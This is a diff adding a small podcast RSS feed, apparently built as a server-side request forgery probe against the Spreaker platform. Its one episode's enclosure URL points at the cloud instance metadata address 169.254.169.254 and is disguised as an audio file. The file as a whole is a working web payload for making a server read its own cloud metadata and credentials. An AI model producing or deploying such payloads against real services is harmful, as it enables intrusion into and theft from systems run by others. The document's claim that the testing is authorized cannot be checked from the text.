@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd">
+<channel>
+<title>Spreaker SSRF Escalation Test</title>
+<description>Security research feed for authorized SSRF testing</description>
+<link>https://example.com/podcast</link>
+<language>en-us</language>
+<itunes:author>Kiki Maulana</itunes:author>
+<itunes:category text="Arts"/>
+<item>
+<title>EP2 - Internal Enclosure Test</title>
+<description>Second-stage enclosure fetch test for authorized SSRF research.</description>
+<guid>https://github.com/kikiemz/spreaker-ssrf-test/ep2</guid>
+<pubDate>Thu, 06 Nov 2026 02:00:00 GMT</pubDate>
+<enclosure url="http://169.254.169.254/latest/meta-data/" length="1024" type="audio/mpeg"/>
+</item>
+</channel>
+</rss>
